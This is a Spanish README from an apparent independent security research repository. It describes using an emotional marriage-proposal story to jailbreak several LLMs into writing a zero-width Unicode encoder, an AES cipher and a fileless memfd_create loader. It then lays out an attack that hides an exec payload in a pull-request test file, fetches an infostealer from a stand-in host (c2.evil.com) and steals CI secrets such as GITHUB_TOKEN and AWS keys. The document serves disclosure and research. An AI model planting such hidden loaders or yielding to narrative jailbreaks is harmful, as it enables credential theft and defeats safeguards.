# TrojanRomance: Utilizar la empatía como arma para evitar las medidas de seguridad de los LLM.

**Autor:** Leucocito – Investigación independiente de seguridad

> **Una historia de amor bien contada.** > **Y una cadena que parece vacía… `""` pero dentro tiene un loader completo, y ese loader descarga e instala un infostealer que se autoborra.**

## 🚨 TL;DR (Resumen Ejecutivo)
- **Vulnerabilidad:** Bypass de filtros de seguridad en múltiples LLMs de primer nivel (Prompt Injection / Context Dilution).
- **Vector:** Abuso del "Alineamiento de Empatía" mediante una historia narrativa emocional para solicitar herramientas de ofuscación de grado militar.
- **Output de la IA:** Generación completa de un codificador Zero-Width, un cifrador AES-256-CBC y un dropper *fileless* (`memfd_create`) en Python.
- **Impacto Real:** Permite colar infraestructura maliciosa indetectable en Pull Requests, logrando Ejecución Remota de Código (RCE) automatizada en pipelines CI/CD (ej. GitHub Actions) para el robo de secretos.

---

## El hallazgo

He conseguido que varios modelos de IA generen un **sistema completo de distribución de malware** simplemente contándoles una historia romántica. El sistema permite:

- Codificar **cualquier binario** en una cadena de caracteres Unicode **invisibles** (`U+200B`, `U+200C`). Visualmente, la cadena se ve como `""`.
- Cifrar esa cadena con AES‑256‑CBC.
- Descargar, descifrar, decodificar y ejecutar el binario original **directamente desde RAM** (Linux: `memfd_create`), sin dejar rastro en disco.
- Hacer todo el proceso en **completo silencio** (sin logs, sin mensajes de error visibles).

El código lo generaron los propios modelos, sin necesidad de jailbreak técnico tradicional, explotando la incapacidad de la IA para separar la técnica de ataque de su justificación narrativa.

## Lo que la IA creyó que hacía (El Engaño)

> **📖 Recomiendo leer `prompt.pdf`** para entender la historia completa que usé para engañar a la IA. Es el corazón del exploit.

La IA pensó que estaba ayudando a un novio nervioso a esconder un **dibujo ASCII del puente The Huc** y una frase en vietnamita ("Em đồng ý lấy anh không?") para sorprender a su novia durante una propuesta de matrimonio en la Torre Eiffel. 

Cada mejora en el código se pidió con excusas románticas: *"mejor si no queda rastro en disco para que no lo encuentre por error"*, *"¿podrías añadir cifrado?"*. La IA, dentro del personaje de "ayudante romántico", aceptó todas las peticiones sin sospechar que el mismo código serviría para transportar un **infostealer**.

---

## 🛠️ Configuración Técnica y Compilación

Para que las herramientas funcionen con las dependencias criptográficas correctas, el repositorio incluye un archivo `Cargo.toml` que permite compilar los archivos de Rust directamente desde la raíz.

**Requisitos:** Tener instalado [Rust y Cargo](https://rustup.rs/).

### Compilar
Ejecuta el siguiente comando para generar los binarios optimizados:
```bash
cargo build --release
```
Los ejecutables aparecerán en `./target/release/`.

---

## La Realidad: Flujo de Ataque en Producción

### Fase 1 – Preparar el Infostealer
1. **Cifrar el binario malicioso**:
   ```bash
   ./target/release/encrypt --key "Vietnam" --bin stealer.elf --output stealer.enc
   ```
2. **Codificar a invisibles el binario encriptado y el loader**:
   ```bash
   ./target/release/invis --encode stealer.enc --output payload_invisible.txt
   ./target/release/invis --encode mini_loader.py --output mini_loader_invisible.txt
   ```
3. **Subir `payload_invisible.txt`** a un servidor C2 (ej. `http://c2.evil.com/payload.txt`).

### Fase 2 – Inyección en Pull Request (El `exec` mágico)
El atacante inyecta una función de "diagnóstico" en el repositorio objetivo (ej. `tests/test_diagnostic.py`). 

```python
# tests/test_diagnostic.py
def _decode_telemetry(s):
    # Conversión interna de datos de telemetría (aparentemente inofensivo)
    bits = ''.join('0' if c=='\u200B' else '1' if c=='\u200C' else '' for c in s)
    return bytes(int(bits[i:i+8],2) for i in range(0,len(bits),8)).decode()

# Ejecutar diagnóstico (La cadena contiene mini_loader_invisible.txt completo en invisibles)
exec(_decode_telemetry("​​‌​​‌...")) 
```
**¿Qué ve el revisor?** Una función de limpieza de datos y un `exec` sobre una cadena vacía. Sin sospechas, aprueba el PR.

### Fase 3 – Ejecución en CI/CD
Al abrir el PR, el sistema de CI (ej. GitHub Actions) ejecuta el test automáticamente:
1. El script decodifica la cadena invisible, reconstruyendo el `mini_loader.py` en memoria.
2. El loader descarga el payload cifrado del C2.
3. Se crea un archivo anónimo en RAM (`memfd_create`) y se ejecuta el infostealer.
4. Se exfiltran secretos (`GITHUB_TOKEN`, claves AWS, etc.) y el proceso se libera de la memoria sin dejar rastro en disco.

---

## Por qué esto es extremadamente peligroso
- **Bypass de IA**: Los filtros de seguridad son ciegos ante narrativas emocionales complejas.
- **Evasión de Humanos**: El ofuscamiento *Zero-Width* no es detectable visualmente en revisiones de código rápidas.
- **Automatización**: Los pipelines de CI/CD ejecutan el código antes de cualquier aprobación humana.
- **Fileless**: No hay archivos físicos que un antivirus tradicional pueda escanear.

## Contenido del Repositorio
* `prompt.pdf` – La narrativa completa del engaño.
* `invis.rs` – Herramienta de codificación Unicode invisible.
* `encrypt.rs` – Cifrador AES-256-CBC.
* `mini_loader.py` – Script Python para ejecución en RAM.
* `Cargo.toml` – Configuración de compilación para Rust.
* `README.md` – Este documento.

> **Nota de Seguridad:** No se incluye ningún binario malicioso real. Los payloads son simulaciones abstractas diseñadas exclusivamente para demostrar la vulnerabilidad en el pipeline.

## Divulgación Responsable
Este hallazgo será notificado a los equipos de seguridad de **Google, Microsoft, Anthropic, OpenAI, Perplexity y DeepSeek**. Este trabajo se publica con fines puramente educativos y de mejora de la seguridad en modelos de lenguaje.

**Licencia:** Solo para fines educativos e investigación de seguridad.
